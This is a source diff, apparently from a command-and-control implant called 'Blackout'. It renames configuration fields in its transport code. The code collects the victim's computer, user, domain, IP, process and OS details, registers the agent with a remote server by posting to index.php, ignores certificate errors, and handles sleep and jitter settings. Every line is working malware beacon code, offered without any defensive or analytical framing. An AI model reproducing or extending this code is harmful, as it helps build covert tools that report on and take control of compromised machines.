@@ -1,5 +1,4 @@
 #include <Transport.h>
-#include <Command.h>
 #include <Common.h>
 #include <Utils.h>
 
@@ -37,27 +36,28 @@ FUNC BOOL TransportInit()
     // Add AES Keys/IV
     // PackageAddPad( Package, Blackout.Config.AES.Key, 32 );
     // PackageAddPad( Package, Blackout.Config.AES.IV,  16 );
+    
 
-    PackageAddInt32(  Package, Instance()->Config.Session.AgentId       );
-    PackageAddString(  Package, Instance()->Config.CompData.ComputerName );
-    PackageAddString(  Package, Instance()->Config.CompData.UserName     );
-    PackageAddString(  Package, Instance()->Config.CompData.DomainName   );
-    PackageAddString( Package, Instance()->Config.CompData.IpAddress    );
-    PackageAddWString( Package, Instance()->Config.Session.ProcessName );
-    PackageAddInt32( Package, Instance()->Config.Session.ProcessId );
+    PackageAddInt32(   Package, Instance()->Session.AgentId       );
+    PackageAddString(  Package, Instance()->System.ComputerName );
+    PackageAddString(  Package, Instance()->System.UserName     );
+    PackageAddString(  Package, Instance()->System.DomainName   );
+    PackageAddString(  Package, Instance()->System.IpAddress    );
+    PackageAddWString( Package, Instance()->Session.ProcessName   );
+    PackageAddInt32( Package, Instance()->Session.ProcessId );
     PackageAddInt32( Package, (DWORD) 0 );
-    PackageAddInt32( Package, Instance()->Config.Session.ProcessArch );
+    PackageAddInt32( Package, Instance()->Session.ProcessArch );
     PackageAddInt32( Package, FALSE ); // default
 
-    PackageAddInt32( Package, Instance()->Config.CompData.OsMajorV );
-    PackageAddInt32( Package, Instance()->Config.CompData.OsMinorv );
-    PackageAddInt32( Package, Instance()->Config.CompData.ProductType );
+    PackageAddInt32( Package, Instance()->System.OsMajorV );
+    PackageAddInt32( Package, Instance()->System.OsMinorv );
+    PackageAddInt32( Package, Instance()->System.ProductType );
     PackageAddInt32( Package, 0x00 );
-    PackageAddInt32( Package, Instance()->Config.CompData.OsBuildNumber );
+    PackageAddInt32( Package, Instance()->System.OsBuildNumber );
 
-    PackageAddInt32( Package, Instance()->Config.CompData.OsArch );
-    PackageAddInt32( Package, Instance()->Config.Session.SleepTime );
-    PackageAddInt32( Package, Instance()->Config.Session.Jitter );
+    PackageAddInt32( Package, Instance()->System.OsArch );
+    PackageAddInt32( Package, Instance()->Session.SleepTime );
+    PackageAddInt32( Package, Instance()->Session.Jitter );
     PackageAddInt32( Package, 0x00 ); //killdate
     PackageAddInt32( Package, 0x00 ); //workinghours
     // End of Options
@@ -68,11 +68,11 @@ FUNC BOOL TransportInit()
 
         if ( Data )
         {
-            Instance()->Win32.printf( "Agent => %x : %x\n", ( UINT32 ) C_DEF( Data ), ( UINT32 ) Instance()->Config.Session.AgentId );
-            if ( ( UINT32 ) Instance()->Config.Session.AgentId == ( UINT32 ) C_DEF( Data ) )
+            Instance()->Win32.printf( "Agent => %x : %x\n", ( UINT32 ) C_DEF( Data ), ( UINT32 ) Instance()->Session.AgentId );
+            if ( ( UINT32 ) Instance()->Session.AgentId == ( UINT32 ) C_DEF( Data ) )
             {
                 Instance()->Win32.printf("CONNECTED!\n");
-                Instance()->Config.Session.Connected = TRUE;
+                Instance()->Session.Connected = TRUE;
                 Success = TRUE;
             }
         }
@@ -102,7 +102,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = FALSE;
 
-    hSession = Instance()->Win32.WinHttpOpen( Instance()->Config.TransportWeb.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
+    hSession = Instance()->Win32.WinHttpOpen( Instance()->Transport.UserAgent, HttpAccessType, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
     if ( ! hSession )
     {
         Instance()->Win32.printf( "WinHttpOpen: Failed => %d\n", NtGetLastError() );
@@ -110,7 +110,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         goto LEAVE;
     }
 
-    hConnect = Instance()->Win32.WinHttpConnect( hSession, Instance()->Config.TransportWeb.Host, Instance()->Config.TransportWeb.Port, 0 );
+    hConnect = Instance()->Win32.WinHttpConnect( hSession, Instance()->Transport.Host, Instance()->Transport.Port, 0 );
     Instance()->Win32.printf( "> WinHttpConnect=> %d\n", NtGetLastError() );
     if ( ! hConnect )
     {
@@ -122,7 +122,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
-    if ( Instance()->Config.TransportWeb.Secure ){
+    if ( Instance()->Transport.Secure ){
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
@@ -135,7 +135,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
         return FALSE;
     }
 
-    if ( Instance()->Config.TransportWeb.Secure )
+    if ( Instance()->Transport.Secure )
     {
         HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
@@ -193,7 +193,7 @@ FUNC BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T Recv
     else
     {
         if ( NtGetLastError() == 12029 ) { // ERROR_INTERNET_CANNOT_CONNECT
-            Instance()->Config.Session.Connected = FALSE;
+            Instance()->Session.Connected = FALSE;
         }else {
             Instance()->Win32.printf("WinHttpSendRequest: Failed => %d\n", NtGetLastError());
         }
